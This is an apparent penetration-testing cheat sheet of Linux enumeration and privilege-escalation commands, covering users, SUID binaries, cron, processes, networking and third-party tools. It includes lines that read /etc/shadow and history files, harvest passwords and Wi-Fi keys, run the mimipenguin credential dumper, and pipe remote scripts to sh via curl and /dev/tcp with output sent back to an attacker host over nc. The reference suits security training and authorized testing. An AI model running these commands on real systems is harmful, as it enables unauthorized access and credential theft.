##### Print Hosts to File
```bash
printf 'host1.com\nhost2.com\nhost3.com\nhost4.com\n' > hosts
```

##### Release LSB Modules
```bash
lsb_release
```

##### Examine file capabilities
```bash
getcap -r / 2>/dev/null
```

##### Translate Characters
Usage: tr [OPTION]... SET1 [SET2]
Translate, squeeze, and/or delete characters from standard input,
writing to standard output.

| Flag | Description |
|------|-------------|
| -c, -C, --complement  | use the complement of SET1
| -d, --delete          | delete characters in SET1, do not translate
| -s, --squeeze-repeats | v replace each sequence of a repeated character that is listed in the last specified SET, with a single occurrence of that character
| -t, --truncate-set1   | first truncate SET1 to length of SET2
|     --help    | display this help and exit
|     --version | output version information and exit

SETs are specified as strings of characters.  Most represent themselves.
Interpreted sequences are:

| Flag | Description |
|------|-------------|
| \NNN          | character with octal value NNN (1 to 3 octal digits)
| \\            | backslash
| \a            | audible BEL
| \b            | backspace
| \f            | form feed
| \n            | new line
| \r            | return
| \t            | horizontal tab
| \v            | vertical tab
| CHAR1-CHAR2   | all characters from CHAR1 to CHAR2 in ascending order
| [CHAR*]       | in SET2, copies of CHAR until length of SET1
| [CHAR*REPEAT] | REPEAT copies of CHAR, REPEAT octal if starting with 0
| [:alnum:]     | all letters and digits
| [:alpha:]     | all letters
| [:blank:]     | all horizontal whitespace
| [:cntrl:]     | all control characters
| [:digit:]     | all digits
| [:graph:]     | all printable characters, not including space
| [:lower:]     | all lower case letters
| [:print:]     | all printable characters, including space
| [:punct:]     | all punctuation characters
| [:space:]     | all horizontal or vertical whitespace
| [:upper:]     | all upper case letters
| [:xdigit:]    | all hexadecimal digits
| [=CHAR=]      | all characters which are equivalent to CHAR

```bash
tr
```

# Text Conversions

##### Hex to ASCII
```bash
echo 4961676963 | xxd -r -p
```

# System Information

##### Metasploit's enum_configs
##### Metasploit's enum_system

##### Hostname
```bash
hostname
```

##### Kernel Version
```bash
uname -a
```

##### CPU Architecture
```bash
lscpu
```

##### Current User
```bash
# ID
id

# /etc/passwd Information
grep $USER /etc/passwd

# $PATH variable
echo $PATH

# Permissions
find / -user $USER
```

##### Check User Permissions
```bash
find / -user <username>
```

##### Most Recent Logins
```bash
lastlog
```

##### Currently Logged-on Users
```bash
w
```

##### Last Logged-on Users
```bash
last
last -a
```

##### Check for access to WWW pages
```bash
touch /var/www/file
```

##### All Users with UID & GID Information
```bash
for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done
```

##### List All root Accounts
```bash
cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
```

##### List Users / Read passwd
```bash
cat /etc/passwd
```

##### Check shadow readability
```bash
cat /etc/shadow
```

##### Check bash history readability
```bash
# For root
cat /root/.bash_history

# For all other users
find /home/* -name *.*history* -print 2>/dev/null
find /* -name *.*history* -print 2>/dev/null
```

##### Operating System
```bash
cat /etc/issue
cat /etc/*-release
```

##### List root's home directory
```bash
ls -als /root/
```

##### Check access to other users' home directoroes
```bash
ls -als /home/*
```

##### World-writeable files
```bash
find / -perm -2 -type f 2>/dev/null
```

##### List open files
```bash
lsof -n
```

##### List installed packages (Debian)
```bash
dpkg -l
```

##### Common Software Versions
```bash
sudo -V
httpd -v
apache2 -v
mysql -V
sendmail -d0.1
```

##### Start/Stop Service
```bash
service <service name> start/stop
```

### SUDO
##### Check Sudo Permissions
```bash
# All
sudo -l

# Known binaries to establish shell
sudo -l | grep vim
sudo -l | grep nmap
sudo -l | grep vi
```
##### Check Sudoers Readability
```bash
cat /etc/sudoers
```

### SUID / GUID
##### Check if Binary is SUID/GUID
```bash
ls -als <Binary Name>
```
##### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# find - Initiates the "find" command
# / - Searches the whole file system
# -perm - searches for files with specific permissions
# -u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
# -type f - Only search for files
# 2>/dev/null - Suppresses errors 
```
##### Find SUID Binaries Owned by root
```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```
##### Find GUID Binaries
```bash
find / -perm -2000 -type f 2>/dev/null
```
##### Find SUID & SGID Binaries
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
#### SUID/GUID References
[How to Find Files With setuid Permissions](https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html)

### Cron Jobs
##### List Cron Jobs
```bash
cat /etc/crontab
```
##### List Cron Jobs
```bash
ls -als /etc/cron*
```
##### World-writeable Cron Jobs
```bash
find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
```

### Processes
##### Shows Process For All Users
```bash
ps a
```
##### Shows Process Owner
```bash
ps u
```
##### Shows Processes With Terminal Information
```bash
ps x
```
##### Shows User, All Processes and Terminal Information
```bash
ps aux
```
##### Show Processes Running as Root
```bash
ps -u root
```
##### Show Processes Running as Current User
```bash
ps -u $USER
```

##### List process binaries/paths & permissions
```bash
ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
```

### Configuration & Clear Text Files
##### Find all Config files in /etc
```bash
ls -al /etc/*.conf
```
##### Recursively, find all that contain the string "pass"
```bash
grep -r pass* /etc/*.conf 2>/dev/null
```
##### Check access to configuration files
```bash
find /etc/init.d/ ! -uid 0 -type f 2>/dev/null | xargs ls -la
```
##### Find dotfiles with history in name
```bash
find /* -name *.*history* -print 2>/dev/null
```
##### Check Apache log for user and pass
```bash
cat /var/log/apache/access.log | grep -E "^user|^pass"
```

### Restricted Shells
##### Test for Restricted Shell with Redirect
```bash
id > id.txt
```
##### Check Environment Variables for Restricted Shell
```bash
echo $PATH
echo $SHELL
```

### 3rd Party Tools
##### [LinEnum](https://github.com/rebootuser/LinEnum)
```bash
./LinEnum.sh -s -r report -e /tmp/ -t
```
##### [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
```bash
# Running on Legacy Python 2.6/2.7 System
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
python linuxprivchecker.py -w -o linuxprivchecker.log

# Running Later Versions of Python
pip install linuxprivchecker
linuxprivchecker -w -o linuxprivchecker.log
# if runpy fails to add the script to your path
python3 -m linuxprivchecker -w -o linuxprivchecker.log
```

##### [Unix-Privesc-Check](https://pentestmonkey.net/tools/unix-privesc-check)
```bash
wget "https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz"
./unix-privesc-check > output.txt
```

##### [MimiPenguin](https://github.com/huntergregal/mimipenguin)
```bash
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
chmod +x mimipenguin.sh
./mimipenguin.sh
```

##### [UNIX-PrivEsc](https://github.com/FuzzySecurity/Unix-PrivEsc)
```bash
https://github.com/FuzzySecurity/Unix-PrivEsc
```

##### [LinPEAS](https://github.com/carlospolop/PEASS-ng)
```bash
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victi

# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

##### [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)
```bash
perl Linux_Exploit_Suggester.pl -k <Kernel Version>
```

##### [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### System Information References
[Local Linux Enumeration & Privilege Escalation Cheatsheet](https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623)

[LinEnum](https://github.com/rebootuser/LinEnum)

[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)

[Unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

[mimipenguin](https://github.com/huntergregal/mimipenguin)

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Unix-PrivEsc](https://github.com/FuzzySecurity/Unix-PrivEsc)

[PEASS (LinPEAS / WinPEAS)](https://github.com/carlospolop/PEASS-ng)

[LinPEAS](https://www.aldeid.com/wiki/LinPEAS)

[LinPEAS](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)

[Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)

[SUID](https://en.wikipedia.org/wiki/Setuid)

[EUID](https://en.wikipedia.org/wiki/User_identifier#Effective_user_ID)

[A description of RPATH $ORIGIN LD_LIBRARY_PATH and portable linux binaries](https://enchildfone.wordpress.com/2010/03/23/a-description-of-rpath-origin-ld_library_path-and-portable-linux-binaries/)

[The GNU C library dynamic linker expands $ORIGIN in setuid library search path](https://seclists.org/fulldisclosure/2010/Oct/257)

[Sudo](https://en.wikipedia.org/wiki/Sudo)

[dockerevil](https://github.com/pyperanger/dockerevil)

[chroot (Restricted Shell)](https://en.wikipedia.org/wiki/Chroot)

[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

# Network Information
##### List All Interfaces
```bash
ifconfig -a
```

##### IP Address Only
```bash
ip -4 -o addr show [Interface] | awk '{print $4}' | cut -d "/" -f 1 
```
##### IP Address Only with Subnet
```bash
ip -4 -o addr show [Interface] | awk '{print $4}'
```

##### List Network Routes with route
```bash
route -v -n
```

##### Number of hops
```bash
tracert -n <IP Address>
```

##### DNS Information
```bash
cat /etc/resolv.conf
```

##### ARP Cache
```bash
arp -en
```

##### Connections
```bash
# Active TCP/UDP connections and listening TCP/UDP ports.
netstat -auntp

# Active connections, processes, users, and bytes.
ss -twurp
```

##### Check for Open, Outgoing Ports
```bash
nmap -sT -p<ports> portquiz.net
# Avoid IDS and rate limiting on Portquiz.net
nmap -sT -p<ports> -T<lownumber> portquiz.net
```

### Configuration & Clear Text Files
##### Dump clear text, pre-shared, wireless keys, from Network Manager
```bash
cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk"
```

### Network Information References
[netstat without netstat](https://staaldraad.github.io/2017/12/20/netstat-without-netstat/)

[portquiz.net](http://portquiz.net/)

[Command execution with a MySQL UDF](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

# Network Commands
##### Get IP address
```bash
ip a

# Show specific interface.
ip a show eth0

ifconfig

ip addr
```

##### Identify Reachable Networks
```bash
ip route show dev <Interface Name>
```

##### Check Routing Table
```bash
ip route

netstat -rn

route -n
```

##### Create a Route
```bash
ip route add <network_ip>/<cidr> via <gateway_ip>

# Over specific interface.
ip route add <network_ip>/<cidr> via <gateway_ip> dev <network_card_name>
```

##### Masquerade IP
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s <Network>/<Subnet> -o <Interface Name> -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE
```

##### Interactive Sudo Shell
```bash
sudo -i
```

##### Enable IP Forwarding
```bash
sudo -i
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### Setup Port Redirection Using Tables
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080

```

##### Find
```bash
find / -name <Name To Find> 2>/dev/null
```

##### Watch file permissions with time
```bash
watch -n 0 ls -l /bin/bash
```

##### Make links between files
| | |
|-|-|
|     --backup[=CONTROL] |    make a backup of each existing destination file
| -b                     |    like --backup but does not accept an argument
| -d, -F, --directory    |    allow the superuser to attempt to hard link directories (note: will probably fail due to system restrictions, even for the superuser)
| -f, --force            |    remove existing destination files
| -i, --interactive      |    prompt whether to remove destinations
| -L, --logical          |    dereference TARGETs that are symbolic links
| -n, --no-dereference   |    treat LINK_NAME as a normal file if it is a symbolic link to a directory
| -P, --physical         |    make hard links directly to symbolic links
| -r, --relative         |    create symbolic links relative to link location
| -s, --symbolic         |    make symbolic links instead of hard links
| -S, --suffix=SUFFIX    |    override the usual backup suffix
| -t, --target-directory=DIRECTORY | specify the DIRECTORY in which to create the links
| -T, --no-target-directory | treat LINK_NAME as a normal file always
| -v, --verbose          |    print name of each linked file
|     --help   | display this help and exit
|     --version | output version information and exit

```bash
ln
```

# C
##### Check for Linux C Compiler
```bash
gcc --version
```
##### Compile for Linux
```bash
gcc <Input>.c -o <Output>

# Specify architecture (32-bit)
gcc -m32 <Input>.c -o <Output>

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```


# References
[bash(1) — Linux manual page](https://www.man7.org/linux/man-pages/man1/bash.1.html)

[sh(1p) — Linux manual page](https://man7.org/linux/man-pages/man1/sh.1p.html)